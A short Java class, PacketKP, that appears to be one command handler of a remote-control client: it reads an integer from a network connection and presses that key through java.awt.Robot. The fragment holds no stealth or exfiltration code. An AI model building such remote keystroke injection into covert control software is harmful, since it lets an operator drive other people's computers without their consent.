package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketKP extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		int btn = Connection.readInt();
		Main.robot.keyPress(btn);
	}

}
